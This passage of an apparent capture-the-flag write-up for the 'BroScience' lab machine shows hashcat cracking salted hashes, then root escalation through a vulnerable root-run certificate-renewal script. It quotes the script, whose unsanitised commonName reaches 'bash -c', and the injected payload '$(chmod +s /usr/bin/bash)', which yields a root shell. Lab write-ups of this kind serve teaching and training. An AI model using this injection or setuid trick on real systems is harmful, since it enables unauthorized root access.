+<li>Run hashcat to crack the hashes</li>
+</ul>
+<pre tabindex="0"><code>&gt; hashcat -m 20 hash.txt rockyou.txt
+
+13edad4932da9dbb57d9cd1********4:NaCl:i**************m
+5d15340bded5b9395d5d14b********b:NaCl:A*************t
+bd3dad50e2d578ecba87d5f********5:NaCl:2****************s
+</code></pre><ul>
+<li>Login as <code>bill</code> via ssh to get the user flag</li>
+</ul>
+<h2 id="pe-root">PE: root</h2>
+<ul>
+<li>Upload pspy64 and note there is a process that executes a script at <code>/opt/renew_cert.sh</code> as root</li>
+</ul>
+<pre tabindex="0"><code>timeout 10 /bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt
+</code></pre><ul>
+<li>Examine the script at <code>/opt/renew_cert.sh</code>. It checks for a certificate and if it&rsquo;s going to expire in a day, it will renew it. Many of these fields are vulnerable to command injection attack. Yet some of them would have character limit when creating the certificate. Hence the best choice to attack is commonName.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$#<span style="color:#e6db74">&#34;</span> -ne <span style="color:#ae81ff">1</span> <span style="color:#f92672">]</span> <span style="color:#f92672">||</span> <span style="color:#f92672">[</span> $1 <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;-h&#34;</span> <span style="color:#f92672">]</span> <span style="color:#f92672">||</span> <span style="color:#f92672">[</span> $1 <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;--help&#34;</span> <span style="color:#f92672">]</span> <span style="color:#f92672">||</span> <span style="color:#f92672">[</span> $1 <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;help&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;Usage: </span>$0<span style="color:#e6db74"> certificate.crt&#34;</span>;
+</span></span><span style="display:flex;"><span>    exit 0;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -f $1 <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    openssl x509 -in $1 -noout -checkend <span style="color:#ae81ff">86400</span> &gt; /dev/null
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> $? -eq <span style="color:#ae81ff">0</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;No need to renew yet.&#34;</span>;
+</span></span><span style="display:flex;"><span>        exit 1;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    subject<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>openssl x509 -in $1 -noout -subject | cut -d <span style="color:#e6db74">&#34;=&#34;</span> -f2-<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    country<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo $subject | grep -Eo <span style="color:#e6db74">&#39;C = .{2}&#39;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>    state<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo $subject | grep -Eo <span style="color:#e6db74">&#39;ST = .*,&#39;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>    locality<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo $subject | grep -Eo <span style="color:#e6db74">&#39;L = .*,&#39;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>    organization<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo $subject | grep -Eo <span style="color:#e6db74">&#39;O = .*,&#39;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>    organizationUnit<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo $subject | grep -Eo <span style="color:#e6db74">&#39;OU = .*,&#39;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>    commonName<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo $subject | grep -Eo <span style="color:#e6db74">&#39;CN = .*,?&#39;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>    emailAddress<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>openssl x509 -in $1 -noout -email<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    country<span style="color:#f92672">=</span><span style="color:#e6db74">${</span>country:4<span style="color:#e6db74">}</span>
+</span></span><span style="display:flex;"><span>    state<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo <span style="color:#e6db74">${</span>state:5<span style="color:#e6db74">}</span> | awk -F, <span style="color:#e6db74">&#39;{print $1}&#39;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>    locality<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo <span style="color:#e6db74">${</span>locality:3<span style="color:#e6db74">}</span> | awk -F, <span style="color:#e6db74">&#39;{print $1}&#39;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>    organization<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo <span style="color:#e6db74">${</span>organization:4<span style="color:#e6db74">}</span> | awk -F, <span style="color:#e6db74">&#39;{print $1}&#39;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>    organizationUnit<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo <span style="color:#e6db74">${</span>organizationUnit:5<span style="color:#e6db74">}</span> | awk -F, <span style="color:#e6db74">&#39;{print $1}&#39;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>    commonName<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo <span style="color:#e6db74">${</span>commonName:5<span style="color:#e6db74">}</span> | awk -F, <span style="color:#e6db74">&#39;{print $1}&#39;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    echo $subject;
+</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;Country     =&gt; </span>$country<span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;State       =&gt; </span>$state<span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;Locality    =&gt; </span>$locality<span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;Org Name    =&gt; </span>$organization<span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;Org Unit    =&gt; </span>$organizationUnit<span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;Common Name =&gt; </span>$commonName<span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;Email       =&gt; </span>$emailAddress<span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    echo -e <span style="color:#e6db74">&#34;\nGenerating certificate...&#34;</span>;
+</span></span><span style="display:flex;"><span>    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days <span style="color:#ae81ff">365</span> <span style="color:#f92672">&lt;&lt;&lt;</span><span style="color:#e6db74">&#34;</span>$country<span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    </span>$state<span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    </span>$locality<span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    </span>$organization<span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    </span>$organizationUnit<span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    </span>$commonName<span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    </span>$emailAddress<span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;</span> 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    /bin/bash -c <span style="color:#e6db74">&#34;mv /tmp/temp.crt /home/bill/Certs/</span>$commonName<span style="color:#e6db74">.crt&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;File doesn&#39;t exist&#34;</span>
+</span></span><span style="display:flex;"><span>    exit 1;
+</span></span></code></pre></div><ul>
+<li>Generate a certificate with a command injection payload</li>
+</ul>
+<pre tabindex="0"><code>bill@broscience:~$ cd Certs/
+bill@broscience:~/Certs$ openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout broscience.key -out broscience.crt -days 1
+Generating a RSA private key
+...................................................++++
+....................................................................................................++++
+writing new private key to &#39;broscience.key&#39;
+-----
+You are about to be asked to enter information that will be incorporated
+into your certificate request.
+What you are about to enter is what is called a Distinguished Name or a DN.
+There are quite a few fields but you can leave some blank
+For some fields there will be a default value,
+If you enter &#39;.&#39;, the field will be left blank.
+-----
+Country Name (2 letter code) [AU]:
+State or Province Name (full name) [Some-State]:
+Locality Name (eg, city) []:
+Organization Name (eg, company) [Internet Widgits Pty Ltd]:
+Organizational Unit Name (eg, section) []:
+Common Name (e.g. server FQDN or YOUR name) []:$(chmod +s /usr/bin/bash)
+Email Address []:
+</code></pre><ul>
+<li>Wait a while and prompt to root and get the root flag</li>
+</ul>
+<pre tabindex="0"><code>bill@broscience:~/Certs$ bash -p
+bash-5.1# id
+uid=1000(bill) gid=1000(bill) euid=0(root) egid=0(root) groups=0(root),1000(bill)
+bash-5.1# cat /root/root.txt
+</code></pre>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
